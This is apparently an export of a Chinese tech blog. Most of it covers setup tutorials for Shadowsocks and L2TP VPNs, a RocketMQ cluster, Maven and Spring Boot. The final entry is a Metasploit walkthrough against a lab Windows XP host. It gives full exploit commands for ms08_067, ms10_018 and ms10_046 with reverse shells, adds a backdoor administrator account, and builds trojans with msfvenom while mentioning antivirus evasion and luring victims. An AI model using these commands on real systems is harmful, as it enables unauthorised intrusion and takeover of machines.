    <url>%2Fblog%2F2017%2F08%2F24%2F%E6%9C%8D%E5%8A%A1%E5%99%A8%20%E6%90%AD%E5%BB%BAvpn%2F</url>
    <content type="text"><![CDATA[在vps服务器 搭建vpn一、搭建shadowsocks(1).安装shadowsocksCentOS 安装命令:12yum install python-setuptools &amp;&amp; easy_install pip pip install shadowsocks Debian / Ubuntu 安装命令:12apt-get install python-pip pip install shadowsocks (2).编写配置1vi /etc/shadowsocks.json 只有一个用户使用 则添加如下内容12345678910&#123;&quot;server&quot;:&quot;my_server_ip&quot;,&quot;server_port&quot;:8388,&quot;local_address&quot;: &quot;127.0.0.1&quot;,&quot;local_port&quot;:1080,&quot;password&quot;:&quot;mypassword&quot;,&quot;timeout&quot;:300,&quot;method&quot;:&quot;aes-256-cfb&quot;,&quot;fast_open&quot;: false&#125; 多用户使用，则添加如下内容1234567891011121314&#123;&quot;server&quot;:&quot;0.0.0.0&quot;,&quot;port_password&quot;:&#123; &quot;8333&quot;:&quot;mypassword&quot;, &quot;8334&quot;:&quot;mypassword&quot;, &quot;8335&quot;:&quot;mypassword&quot;, &quot;8336&quot;:&quot;mypassword&quot; &#125;,&quot;timeout&quot;:300,&quot;local_port&quot;:&quot;1080&quot;,&quot;local_address&quot;:&quot;127.0.0.1&quot;,&quot;method&quot;:&quot;aes-256-cfb&quot;,&quot;fast_open&quot;: false&#125; 上面的内容都是可以修改的，我只是给你们一个模板 说明字段： 名称 说明 server 您的服务器侦听的地址 server_port 服务器端口 local_address 你本地的地址 LOCAL_PORT 本地监听端口 password 密码 timeout 超时时间几秒钟 method 默认值：“aes-256-cfb”，请参阅加密方式 fast_open 使用TCP_FASTOPEN，true / false (3)、启动1234567#启动ssserver -c /etc/shadowsocks.json -d start#停止ssserver -c /etc/shadowsocks.json -d stop# 如需开机启动,打开/etc/rc.local 在最后添加 ssserver -c /etc/shadowsocks.json -d startecho ssserver -c /etc/shadowsocks.json -d start &gt;&gt; /etc/rc.local (4)、完成如果上面没有报错，说明安装完成了，可以用Shadowrocket 进行连接，中文叫影梭二、安装 L2TP/IPSec 一键包 第二层隧道协议L2TP（第二层隧道协议）是一种工业标准的互联网隧道协议，它使用UDP的1701端口进行通信.L2TP本身并没有任何加密，但是我们可以使用IPSec对L2TP包进行加密。 123456#下载一键安装脚本wget --no-check-certificate https://raw.githubusercontent.com/teddysun/across/master/l2tp.sh# 赋予执行权限chmod +x l2tp.sh# 执行./l2tp.sh 1、然后根据提示输入： 主要改用户名和密钥和密码就行，不懂就回车 默认的用户名：teddysun 默认的密钥：teddysun.com 默认的密码：这是一个随机函数生成的 最后会有显示基本信息 2、操作命令1234567891011121314# 新增用户l2tp -a# 删除用户l2tp -d# 修改现有的用户的密码l2tp -m# 列出所有用户名和密码l2tp -l# 列出帮助信息l2tp -h 三、客户端下载Windows https://github.com/shadowsocks/shadowsocks-windows/releases Mac OS X https://github.com/shadowsocks/ShadowsocksX-NG/releases linux https://github.com/shadowsocks/shadowsocks-qt5/wiki/Installation https://github.com/shadowsocks/shadowsocks-qt5/releases Android https://play.google.com/store/apps/details?id=com.github.shadowsocks https://github.com/shadowsocks/shadowsocks-android/releases 四、连接示例我以windows 为栗子1、下载：https://github.com/shadowsocks/shadowsocks-windows/releases/download/4.0.5/Shadowsocks-4.0.5.zip2、解压3、运行 .exe 文件4、输入账号密码（刚才你安装 shadowsocks 的信息） 5、电脑右下角有个小飞机 右键启动系统代理，(a)、PAC模式 开启 ，把想访问的地址 按照格式写入PAC 文件。(b)、全局模式 开启（新手推荐） 参考自：http://blog.csdn.net/noahsun1024/article/details/52206369https://teddysun.com/448.html]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>干货</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RocketMQ 配置双master]]></title>
    <url>%2Fblog%2F2017%2F08%2F23%2FRocketMQ%20%E9%85%8D%E7%BD%AE%E5%8F%8Cmaster%2F</url>
    <content type="text"><![CDATA[RocketMQ 配置多master一、准备工作1、虚拟机安装两台 Centos72、jdk83、maven 3.5.04、git二、下载并编译123456789git clone -b develop https://github.com/apache/incubator-rocketmq.gitcd incubator-rocketmqmvn -Prelease-all -DskipTests clean install -Ucd distribution/target/apache-rocketmq# 把编译后得到的apache-rocketmq（target下的文件夹就是） 剪切到/usr/local 下并重命名rocketmqcp -r apache-rocketmq /usr/local/ &amp;&amp; cd /user/localmv apache-rocketmq rocketmq# 用scp命令把rocketmq 文件夹复制到另一台机器。也可以在另一个台执行同样的操作。scp -r /usr/local/rocketmq root@192.168.12.133:/usr/local/rocketmq 三、修改broker 的配置文件1、两台电脑都要修改12vim /usr/local/rocketmq/conf/2m-noslave/broker-a.properties vim /usr/local/rocketmq/conf/2m-noslave/broker-b.properties 再多一台就broker-c.properties ,以此类推可以添加多台。。2、修改的内容如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#所属集群名字brokerClusterName=rocketmq-cluster#broker名字，注意此处不同的配置文件填写的不一样，如果是broker-a.properties 这里就写broker-a,broker-b.properties 这里就写broker-b,以此类推brokerName=broker-a#0 表示 Master， &gt;0 表示 SlavebrokerId=0#nameServer地址，分号分割namesrvAddr=rocketmq-nameserver1:9876;rocketmq-nameserver2:9876#在发送消息时，自动创建服务器不存在的topic，默认创建的队列数defaultTopicQueueNums=4#是否允许 Broker 自动创建Topic，建议线下开启，线上关闭autoCreateTopicEnable=true#是否允许 Broker 自动创建订阅组，建议线下开启，线上关闭autoCreateSubscriptionGroup=true#Broker 对外服务的监听端口listenPort=10911#删除文件时间点，默认凌晨 0点deleteWhen=00#文件保留时间，默认 48 小时fileReservedTime=120#commitLog每个文件的大小默认1GmapedFileSizeCommitLog=1073741824#ConsumeQueue每个文件默认存30W条，根据业务情况调整mapedFileSizeConsumeQueue=300000#destroyMapedFileIntervalForcibly=120000#redeleteHangedFileInterval=120000#检测物理文件磁盘空间diskMaxUsedSpaceRatio=88#存储路径storePathRootDir=/usr/local/rocketmq/data#commitLog 存储路径storePathCommitLog=/usr/local/rocketmq/data/commitlog#消费队列存储路径存储路径storePathConsumeQueue=/usr/local/rocketmq/data/consumequeue#消息索引存储路径storePathIndex=/usr/local/rocketmq/data/index#checkpoint 文件存储路径storeCheckpoint=/usr/local/rocketmq/data/checkpoint#abort 文件存储路径abortFile=/usr/local/rocketmq/data/abort#限制的消息大小maxMessageSize=65536#flushCommitLogLeastPages=4#flushConsumeQueueLeastPages=2#flushCommitLogThoroughInterval=10000#flushConsumeQueueThoroughInterval=60000#Broker 的角色#- ASYNC_MASTER 异步复制Master#- SYNC_MASTER 同步双写Master#- SLAVEbrokerRole=ASYNC_MASTER#刷盘方式#- ASYNC_FLUSH 异步刷盘#- SYNC_FLUSH 同步刷盘flushDiskType=ASYNC_FLUSH#checkTransactionMessageEnable=false#发消息线程池数量#sendMessageThreadPoolNums=128#拉消息线程池数量#pullMessageThreadPoolNums=128 只需要修改brokerName这个属性就行，nameservAddr这个使用域名，下面会修改hosts文件。当然也可以用ip,如果用ip，下面的hosts文件配置就可以不用配，这里配的原因主要是为了方便而已没其他含义四、修改/etc/hosts 文件(可选，如果上面的nameservAddr用ip,这个步骤可跳过)1、两台电脑都要修改12345678127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4::1 localhost localhost.localdomain localhost6 localhost6.localdomain6#添加下面4行 ，注意修改成你电脑的ip192.168.12.132 rocketmq-nameserver1192.168.12.132 rocketmq-master1 192.168.12.133 rocketmq-nameserver2192.168.12.133 rocketmq-master2 2、测试: ping 一下12ping rocketmq-nameserver1ping rocketmq-nameserver2 五、修改日志配置文件1、两台电脑都要修改12mkdir /usr/local/rocketmq/logscd /usr/local/rocketmq/conf &amp;&amp; sed -i &apos;s#$&#123;user.home&#125;#/usr/local/rocketmq#g&apos; *.xml 六、修改启动脚本（可不用修改，我是用虚拟机,内存不够,所以改改）1、修改 bin/runserver.sh 2、修改 bin/runbroker.sh 都是改成1G 和 512M七、启动1、启动 nameserver12345nohup sh /usr/local/rocketmq/bin/mqnamesrv &amp;#查看日志tail -n 200 /usr/local/rocketmq/logs/rocketmqlogs/namesrv.log#可以用jps 查看后台程序jps 2、启动 broker123456#在192.168.12.132 中启动nohup sh /usr/local/rocketmq/bin/mqbroker -c /usr/local/rocketmq/conf/2m-noslave/broker-a.properties &gt;/dev/null 2&gt;&amp;1 &amp;#在192.168.12.133 中启动，启动读取不用的配置文件（注意）nohup sh /usr/local/rocketmq/bin/mqbroker -c /usr/local/rocketmq/conf/2m-noslave/broker-b.properties &gt;/dev/null 2&gt;&amp;1 &amp;#查看启动的日志tail -n 200 /usr/local/rocketmq/logs/rocketmqlogs/broker.log 3、端口开放1、注意开放端口 9876 （nameserver 端口） 10909（主要是fastRemotingServer服务使用） 10911（Broker 对外服务的监听端口） 10912 (Master 和Slave同步的数据的端口，) 2、废话一下:/dev/null ：代表空设备文件&gt; ：代表重定向到哪里，例如：echo “123” &gt; /home/123.txt1 ：表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于”1&gt;/dev/null”2 ：表示stderr标准错误&amp; ：表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1 1 &gt; /dev/null 2&gt;&amp;1 语句含义：1 &gt; /dev/null： 首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。2&gt;&amp;1：接着，标准错误输出重定向（等同于）标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。 八、代码示例1、 Consumer类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package com.alibaba.rocketmq.example.quickstart; import java.io.UnsupportedEncodingException;import java.util.List; import com.alibaba.rocketmq.client.consumer.DefaultMQPushConsumer;import com.alibaba.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;import com.alibaba.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;import com.alibaba.rocketmq.client.consumer.listener.MessageListenerConcurrently;import com.alibaba.rocketmq.client.exception.MQClientException;import com.alibaba.rocketmq.common.consumer.ConsumeFromWhere;import com.alibaba.rocketmq.common.message.MessageExt; /** * Consumer，订阅消息 */public class Consumer &#123; public static void main(String[] args) throws InterruptedException, MQClientException &#123; DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(&quot;hello_pushconsumer&quot;); /** * 设置Consumer第一次启动是从队列头部开始消费还是队列尾部开始消费&lt;br&gt; * 如果非第一次启动，那么按照上次消费的位置继续消费 */ consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET); consumer.setNamesrvAddr(&quot;192.168.12.132:9876;192.168.12.133:9876&quot;); consumer.subscribe(&quot;TopicTest&quot;, &quot;*&quot;); consumer.registerMessageListener(new MessageListenerConcurrently() &#123; @Override public ConsumeConcurrentlyStatus consumeMessage(List&lt;MessageExt&gt; msgs, ConsumeConcurrentlyContext context) &#123; try &#123; for(MessageExt msg:msgs)&#123; String topic=msg.getTopic(); String tags=msg.getTags(); String msgBody = new String(msg.getBody(),&quot;utf-8&quot;); System.out.println(topic+&quot; -- &quot;+tags+&quot; -- &quot;+msgBody); &#125; &#125; catch (UnsupportedEncodingException e) &#123; e.printStackTrace(); &#125; return ConsumeConcurrentlyStatus.CONSUME_SUCCESS; &#125; &#125;); consumer.start(); System.out.println(&quot;==================Consumer Started.===========================&quot;); &#125;&#125; 2、Producer类123456789101112131415161718192021222324252627282930313233package com.alibaba.rocketmq.example.quickstart; import com.alibaba.rocketmq.client.exception.MQClientException;import com.alibaba.rocketmq.client.producer.DefaultMQProducer;import com.alibaba.rocketmq.client.producer.SendResult;import com.alibaba.rocketmq.common.message.Message;/** * Producer，发送消息 * */public class Producer &#123; public static void main(String[] args) throws MQClientException, InterruptedException &#123; DefaultMQProducer producer = new DefaultMQProducer(&quot;hello_producer&quot;); producer.setNamesrvAddr(&quot;192.168.12.132:9876;192.168.12.133:9876&quot;); producer.start(); for (int i = 0; i &lt; 1000; i++) &#123; try &#123; Message msg = new Message(&quot;TopicTest&quot;,// topic &quot;TagA&quot;,// tag (&quot;Hello RocketMQ &quot; + i).getBytes()// body ); SendResult sendResult = producer.send(msg); System.out.println(sendResult); &#125; catch (Exception e) &#123; e.printStackTrace(); Thread.sleep(1000); &#125; &#125; producer.shutdown(); &#125;&#125;]]></content>
      <categories>
        <category>MQ</category>
      </categories>
      <tags>
        <tag>MQ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装maven]]></title>
    <url>%2Fblog%2F2017%2F08%2F22%2F%E5%AE%89%E8%A3%85maven%2F</url>
    <content type="text"><![CDATA[安装Maven一、linux 安装Maven官网下载：http://apache.fayea.com/maven/maven-3/3.5.0/binaries/apache-maven-3.5.0-bin.tar.gz123456789101112131415161718#解压到/opt/下tar -zxvf apache-maven-3.5.0-bin.tar.gz -C /opt/ #为了方便配置环境，改名mv /opt/apache-maven-3.5.0 maven #修改/etc/profile 文件vim /etc/profile #在最后添加M2_HOME=/opt/mavenexport PATH=$&#123;M2_HOME&#125;/bin:$&#123;PATH&#125; #让它立即生效source /etc/profile #验证是否安装成功,查看版本mvn -v 二、windows 安装Maven1、官网：http://maven.apache.org/download.cgi 下载2.解压下载的文件我的Maven的解压路径是D盘根目录，Maven路径为 E:\installPath\maven\apache-maven-3.3.93、新建系统变量MAVEN_HOME，变量值为 E:\installPath\maven\apache-maven-3.3.94、需要在Path前面加上%MAVEN_HOME%\bin;5、验证是否配置成功：如果显示如下，说明成功，需要注意的是要先配置好JDK的路径。]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>开发工具</tag>
        <tag>Maven</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简单安装rocketmq]]></title>
    <url>%2Fblog%2F2017%2F08%2F20%2F%E7%AE%80%E5%8D%95%E5%AE%89%E8%A3%85rocketmq%2F</url>
    <content type="text"><![CDATA[下载123456789101112131415# 下载，在http://www-us.apache.org/dist/rocketmq/ 选择合适的版本下载wget http://www-us.apache.org/dist/rocketmq/4.3.2/rocketmq-all-4.3.2-bin-release.zip# 解压unzip rocketmq-all-4.3.2-bin-release.zip -d rocketmq# 启动 nameserver:nohup bin/mqnamesrv -n 127.0.0.1:9876 &gt; /dev/null 2&gt;&amp;1 &amp;# 启动brokermqbroker -n 127.0.0.1:9876 autoCreateTopicEnable=true# 指定配置文件 启动brokermqbroker -c /data/rocketmq/rocketmq/conf/2m-noslave/broker-a.properties &gt; /dev/null 2&gt;&amp;1 &amp;]]></content>
      <categories>
        <category>MQ</category>
      </categories>
      <tags>
        <tag>MQ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring Boot (九)：过滤器、拦截器、监听器]]></title>
    <url>%2Fblog%2F2017%2F08%2F13%2FSpring%20Boot%20(%E4%B9%9D)%EF%BC%9A%E8%BF%87%E6%BB%A4%E5%99%A8%E3%80%81%E6%8B%A6%E6%88%AA%E5%99%A8%E3%80%81%E7%9B%91%E5%90%AC%E5%99%A8%2F</url>
    <content type="text"><![CDATA[springboot 的过滤器、监听器、拦截器 demo一、添加依赖1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt; 二、过滤器 的创建(1)、创建自己的过滤器类实现javax.servlet.Filter接口(2)、重写doFilter 的方法，在此方法里写过滤操作(3)、在类上使用注解@WebFilter(filterName=”myFilter”,urlPatterns={“/*”})三、监听器 的创建(1)、创建自己的监听类实现 ServletContextListener 接口，这个是监听servlet的(2)、创建自己的监听类实现 HttpSessionListener 接口，这个是监听session 的(3)、记得在自定义的监听类上添加注解@WebListener四、拦截器 的创建(1)、创建自己的拦截器类，实现HandlerInterceptor 接口(2)、创建一个配置类，继承自WebMvcConfigurerAdapter ，并在类上添加注解@Configuration(3)、重写addInterceptors方法，把自定义的拦截类注册进去。五、代码示例(1)、过滤器1234567891011121314151617181920212223242526272829/** * * 使用注解标注过滤器 * @WebFilter将一个实现了javax.servlet.Filter接口的类定义为过滤器 * 属性filterName 声明过滤器的名称,可选 * 属性urlPatterns指定要过滤 的URL模式,这是一个数组参数，可以指定多个。也可使用属性value来声明.(指定要过滤的URL模式是必选属性) */@WebFilter(filterName=&quot;myFilter&quot;,urlPatterns=&#123;&quot;/*&quot;&#125;)public class MyFilter implements Filter&#123; @Override public void destroy() &#123; System.out.println(&quot;myfilter 的 销毁方法&quot;); &#125; @Override public void doFilter(ServletRequest arg0, ServletResponse arg1, FilterChain chain) throws IOException, ServletException &#123; System.out.println(&quot;myfilter 的 过滤方法。这里可以执行过滤操作&quot;); //继续下一个拦截器 chain.doFilter(arg0, arg1); &#125; @Override public void init(FilterConfig arg0) throws ServletException &#123; System.out.println(&quot;myfilter 的 初始化方法&quot;); &#125; &#125; (2)、拦截器a)、自定义拦截器123456789101112131415161718192021public class MyInterceptor implements HandlerInterceptor&#123; @Override public void afterCompletion(HttpServletRequest arg0, HttpServletResponse arg1, Object arg2, Exception arg3) throws Exception &#123; System.out.println(&quot;MyInterceptor 在整个请求结束之后被调用，也就是在DispatcherServlet 渲染了对应的视图之后执行&quot;); &#125; @Override public void postHandle(HttpServletRequest arg0, HttpServletResponse arg1, Object arg2, ModelAndView arg3) throws Exception &#123; System.out.println(&quot;MyInterceptor 请求处理之后进行调用，但是在视图被渲染之前（Controller方法调用之后）&quot;); &#125; @Override public boolean preHandle(HttpServletRequest arg0, HttpServletResponse arg1, Object arg2) throws Exception &#123; System.out.println(&quot;MyInterceptor 在请求处理之前进行调用（Controller方法调用之前）这里是拦截的操作&quot;); return true; &#125; &#125; b)、注册拦截器 继承 WebMvcConfigurerAdapter1234567891011@Configurationpublic class WebConfigurer extends WebMvcConfigurerAdapter &#123; @Override public void addInterceptors(InterceptorRegistry registry) &#123; // addPathPatterns 用于添加拦截规则 // excludePathPatterns 排除拦截 registry.addInterceptor(new MyInterceptor()).addPathPatterns(&quot;/**&quot;).excludePathPatterns(&quot;/login&quot;); super.addInterceptors(registry); &#125;&#125; (3)、监听器1234567891011121314@WebListenerpublic class SessionListener implements HttpSessionListener&#123; @Override public void sessionCreated(HttpSessionEvent arg0) &#123; System.out.println(&quot;监听 创建session&quot;); &#125; @Override public void sessionDestroyed(HttpSessionEvent arg0) &#123; System.out.println(&quot;监听 销毁session&quot;); &#125; &#125; (4)、启动类12345678910111213/** * @ServletComponentScan 扫描我们自定义的servlet * @author tyro * */@ServletComponentScan@SpringBootApplicationpublic class SpringbootFilterListenerInterceptorApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(SpringbootFilterListenerInterceptorApplication.class, args); &#125;&#125; Github 代码示例地址：https://github.com/rstyro/spring-boot]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring Boot (八)：配置Druid 连接池]]></title>
    <url>%2Fblog%2F2017%2F08%2F12%2FSpring%20Boot%20(%E5%85%AB)%EF%BC%9A%E9%85%8D%E7%BD%AEDruid%20%E8%BF%9E%E6%8E%A5%E6%B1%A0%2F</url>
    <content type="text"><![CDATA[springboot 配置 Druid连接池一、添加依赖12345678910111213&lt;!-- 驱动 --&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt; &lt;!-- 连接池 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;1.1.0&lt;/version&gt;&lt;/dependency&gt; 二、配置application.properties1234567891011121314151617181920212223242526272829spring.datasource.type = com.alibaba.druid.pool.DruidDataSourcespring.datasource.driverClassName = com.mysql.jdbc.Driverspring.datasource.url = jdbc:mysql://localhost:3306/admin?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=falsespring.datasource.username = usernamespring.datasource.password = password # 下面为连接池的补充设置，应用到上面所有数据源中# 初始化大小，最小，最大spring.druid.datasource.initialSize=5spring.druid.datasource.minIdle=5spring.druid.datasource.maxActive=20# 配置获取连接等待超时的时间spring.druid.datasource.maxWait=60000# 配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒spring.druid.datasource.timeBetweenEvictionRunsMillis=60000# 配置一个连接在池中最小生存的时间，单位是毫秒spring.druid.datasource.minEvictableIdleTimeMillis=300000# Oracle请使用select 1 from dualspring.druid.datasource.validationQuery=SELECT &apos;x&apos;spring.druid.datasource.testWhileIdle=truespring.druid.datasource.testOnBorrow=falsespring.druid.datasource.testOnReturn=false# 打开PSCache，并且指定每个连接上PSCache的大小spring.druid.datasource.poolPreparedStatements=falsespring.druid.datasource.maxPoolPreparedStatementPerConnectionSize=20# 配置监控统计拦截的filters，去掉后监控界面sql无法统计，&apos;wall&apos;用于防火墙spring.druid.datasource.filters=stat,wall,slf4j# 通过connectProperties属性来打开mergeSql功能；慢SQL记录spring.druid.datasource.connectionProperties=druid.stat.mergeSql=true;druid.stat.slowSqlMillis=5000 三、新建Druid 配置类在Spring Boot1.4.0中驱动配置信息没有问题，但是连接池的配置信息不再支持这里的配置项，即无法通过配置项直接支持相应的连接池；这里列出的这些配置项可以通过定制化DataSource来实现。目前Spring Boot中默认支持的连接池有dbcp,dbcp2, tomcat, hikari三种连接池。 由于Druid暂时不在Spring Bootz中的直接支持，故需要进行配置信息的定制：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131package com.greatdrive.admin.config; import java.sql.SQLException; import javax.sql.DataSource; import org.apache.log4j.Logger;import org.springframework.beans.factory.annotation.Value;import org.springframework.boot.context.properties.ConfigurationProperties;import org.springframework.boot.web.servlet.FilterRegistrationBean;import org.springframework.boot.web.servlet.ServletRegistrationBean;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Primary; import com.alibaba.druid.pool.DruidDataSource;import com.alibaba.druid.support.http.StatViewServlet;import com.alibaba.druid.support.http.WebStatFilter; @ConfigurationProperties(prefix = &quot;spring.druid.datasource&quot;)@Configurationpublic class DruidDBConfig &#123; private Logger logger = Logger.getLogger(this.getClass()); @Value(&quot;$&#123;spring.datasource.url&#125;&quot;) private String dbUrl; @Value(&quot;$&#123;spring.datasource.username&#125;&quot;) private String username; @Value(&quot;$&#123;spring.datasource.password&#125;&quot;) private String password; @Value(&quot;$&#123;spring.datasource.driverClassName&#125;&quot;) private String driverClassName; @Value(&quot;$&#123;spring.datasource.initialSize&#125;&quot;) private int initialSize; @Value(&quot;$&#123;spring.datasource.minIdle&#125;&quot;) private int minIdle; @Value(&quot;$&#123;spring.datasource.maxActive&#125;&quot;) private int maxActive; @Value(&quot;$&#123;spring.datasource.maxWait&#125;&quot;) private long maxWait; @Value(&quot;$&#123;spring.datasource.timeBetweenEvictionRunsMillis&#125;&quot;) private int timeBetweenEvictionRunsMillis; @Value(&quot;$&#123;spring.datasource.minEvictableIdleTimeMillis&#125;&quot;) private int minEvictableIdleTimeMillis; @Value(&quot;$&#123;spring.datasource.validationQuery&#125;&quot;) private String validationQuery; @Value(&quot;$&#123;spring.datasource.testWhileIdle&#125;&quot;) private boolean testWhileIdle; @Value(&quot;$&#123;spring.datasource.testOnBorrow&#125;&quot;) private boolean testOnBorrow; @Value(&quot;$&#123;spring.datasource.testOnReturn&#125;&quot;) private boolean testOnReturn; @Value(&quot;$&#123;spring.datasource.poolPreparedStatements&#125;&quot;) private boolean poolPreparedStatements; @Value(&quot;$&#123;spring.datasource.maxPoolPreparedStatementPerConnectionSize&#125;&quot;) private int maxPoolPreparedStatementPerConnectionSize; @Value(&quot;$&#123;spring.datasource.filters&#125;&quot;) private String filters; @Value(&quot;&#123;spring.datasource.connectionProperties&#125;&quot;) private String connectionProperties; @Bean //声明其为Bean实例 @Primary //在同样的DataSource中，首先使用被标注的DataSource public DataSource dataSource()&#123; DruidDataSource datasource = new DruidDataSource(); datasource.setUrl(this.dbUrl); datasource.setUsername(username); datasource.setPassword(password); datasource.setDriverClassName(driverClassName); //configuration datasource.setInitialSize(initialSize); datasource.setMinIdle(minIdle); datasource.setMaxActive(maxActive); datasource.setMaxWait(maxWait); datasource.setTimeBetweenEvictionRunsMillis(timeBetweenEvictionRunsMillis); datasource.setMinEvictableIdleTimeMillis(minEvictableIdleTimeMillis); datasource.setValidationQuery(validationQuery); datasource.setTestWhileIdle(testWhileIdle); datasource.setTestOnBorrow(testOnBorrow); datasource.setTestOnReturn(testOnReturn); datasource.setPoolPreparedStatements(poolPreparedStatements); datasource.setMaxPoolPreparedStatementPerConnectionSize(maxPoolPreparedStatementPerConnectionSize); try &#123; datasource.setFilters(filters); &#125; catch (SQLException e) &#123; logger.error(&quot;druid configuration initialization filter&quot;, e); &#125; datasource.setConnectionProperties(connectionProperties); return datasource; &#125; @Bean public ServletRegistrationBean druidServlet() &#123; ServletRegistrationBean reg = new ServletRegistrationBean(); reg.setServlet(new StatViewServlet()); reg.addUrlMappings(&quot;/druid/*&quot;); reg.addInitParameter(&quot;allow&quot;, &quot;127.0.0.1,192.168.1.83&quot;); //白名单 reg.addInitParameter(&quot;deny&quot;,&quot;&quot;); //黑名单 reg.addInitParameter(&quot;loginUsername&quot;, &quot;admin&quot;);//查看监控的用户名 reg.addInitParameter(&quot;loginPassword&quot;, &quot;nimda&quot;);//密码 return reg; &#125; @Bean public FilterRegistrationBean filterRegistrationBean() &#123; FilterRegistrationBean filterRegistrationBean = new FilterRegistrationBean(); filterRegistrationBean.setFilter(new WebStatFilter()); filterRegistrationBean.addUrlPatterns(&quot;/*&quot;); filterRegistrationBean.addInitParameter(&quot;exclusions&quot;, &quot;*.js,*.gif,*.jpg,*.png,*.css,*.ico,/druid/*&quot;); return filterRegistrationBean; &#125;&#125;]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Metasploit 的一些渗透命令记录]]></title>
    <url>%2Fblog%2F2017%2F08%2F12%2FMetasploit%20%E7%9A%84%E4%B8%80%E4%BA%9B%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[学黑客技术必备啊简单来说，Metasploit是一款开源的安全漏洞检测工具，它本身附带一千多个渗透方式，和数百种攻击载荷来看看长啥样 下面记录关于windows xp 系统的一些漏洞。进行攻击的命令记录测试环境：1、kali2.02、windows xp pro1、漏洞： ms08_06712345678910# 可通过命令来查看详情:search ms08_067use exploit/windows/smb/ms08_067_netapi //使用exploitset payload windows/meterpreter/reverse_tcp //设置攻击载荷show options //查看参数配置set RHOST 192.168.12.131 //设置目标主机ip ，我这里的目标主机为192.168.12.131set LHOST 192.168.12.130 //设置本机ip ，我这里的本主机为192.168.12.130set target 0 //这个设置自动run //开始攻击# 获取到反弹的shellshell //进入对方电脑的终端 2、漏洞 ms10_018（浏览器提权）12345678910111213141516# 同样的我们看看这个漏洞(搜索)：search ms10_018use exploit/windows/browser/ms10_018_ie_behaviors //使用exploitset payload windows/meterpreter/reverse_tcp //设置攻击载荷show options //查看参数配置set SRVHOST 192.168.12.130 //设置服务器主机ip ，我这里的目标主机为192.168.12.130set LHOST 192.168.12.130 //设置本机ip ，我这里的本主机为192.168.12.130set URIPATH test //这个设置项目名为testexploit //开始渗透 # 等待目标访问我们的网页，或者引诱目标访问我们的网页# 获取到session(当出现类似： Successfully migrated to services.exe (680) 这样就是成功了)sessions -i //查看 sessionsession -i 1 //选择id ，1就是id# 获得shell# 可以在对方的系统上添加一个管理员权限：命令如下net user admin admin123 /add //这条命令的意思是新建一个用户admin,密码为admin123net localgroup administrators admin /add //这条命令的意思是吧admin 添加到管理员组 3、漏洞 ms10_046（快捷方式漏洞）12345678910111213141516# 同样的我们看看这个漏洞(搜索)：search ms10_046use exploit/windows/browser/ms10_046_shortcut_icon_dllloader //使用exploitset payload windows/meterpreter/reverse_tcp //设置攻击载荷show options //查看参数配置set SRVHOST 192.168.12.130 //设置服务器主机ip ，我这里的目标主机为192.168.12.130set LHOST 192.168.12.130 //设置本机ip ，我这里的本主机为192.168.12.130run //开始渗透 exploit # 等待目标访问我们的网页，或者引诱目标访问我们的网页(或者http://192.168.12.130:80/) 或者文件夹里访问：\\192.168.12.130\ILSSNnFb\ # 获取到session(当出现类似： Successfully migrated to services.exe (680) 这样就是成功了)sessions -l //查看 sessionsession -i 1 //选择id ，1就是id# 获得shell# 可以在对方的系统上添加一个管理员权限：命令如下net user admin admin123 /add //这条命令的意思是新建一个用户admin,密码为admin123net localgroup administrators admin /add //这条命令的意思是吧admin 添加到管理员组 当我们没有发现漏洞的时候，我们就可以利用木马进行攻击了。但是现在的杀毒软件挺成熟的，普通生成的木马容易被发现，所有我们要做的事学会免杀，或者可以和其他软件进行捆绑。免杀是一门高级的学问，在这里就不再讲述了，下面介绍的是用msfvenom 生成木马。 4、木马生成1234567891011121314# 当没有漏洞的时候，就可以使用木马来进行渗透了。# 利用 msfvenom 工具生成木马# -p 是设置payload, -f 是生成文件的格式 /root/muma.exe 是生成的文件名msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.12.130 LPORT=1234 -f exe &gt; /root/muma.exe # 上面是exe 的格式，java的格式如下：msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.12.130 LPORT=1234 -f jar &gt; /root/muma.jar# 如果是java 下面的set payload 也要改成和生成文件的payload 的一致。# 打开msfconsole进行监听use 